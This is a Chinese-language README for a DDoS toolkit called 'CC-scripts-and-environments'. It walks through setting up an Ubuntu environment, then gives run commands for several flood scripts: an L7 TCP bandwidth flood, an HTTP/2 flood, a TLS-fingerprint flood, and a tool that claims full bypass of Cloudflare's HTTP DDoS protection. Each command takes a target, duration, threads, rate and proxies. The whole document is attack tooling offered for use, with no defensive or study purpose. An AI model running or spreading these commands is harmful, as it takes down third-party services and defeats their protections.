# CC-scripts-and-environments
环境准备：


安装操作系统 Ubuntu 22

apt install update - 更新源

apt install curl - 安装curl

chmod 777 * - 给当前目录脚本可执行权限

sh install.sh - 运行安装脚本环境的shell文件


ATTACK脚本介绍和执行命令：


L7 TCP - TCP
通过大量的L7层TCP连接消耗服务器带宽资源

执行命令：
./tcp 目标 时间 代理

HTTPS
原始洪水，HTTP/2.0协议 测试下来洪水量最高的脚本

执行命令：
node tornadov2.js GET/POST 目标 时间 线程 速率 代理 --http 2 --legit

TLS指纹洪水 - TLS
能够绕过一些普防，绕过率和洪水量兼备

执行命令：
node tls.js 目标 时间 速率 线程 代理

cf-yujian
100%绕过 CF-HTTPDDOS HTTP/1.1协议绕过

执行命令：
./fox GET 目标 代理 时间 线程 速率
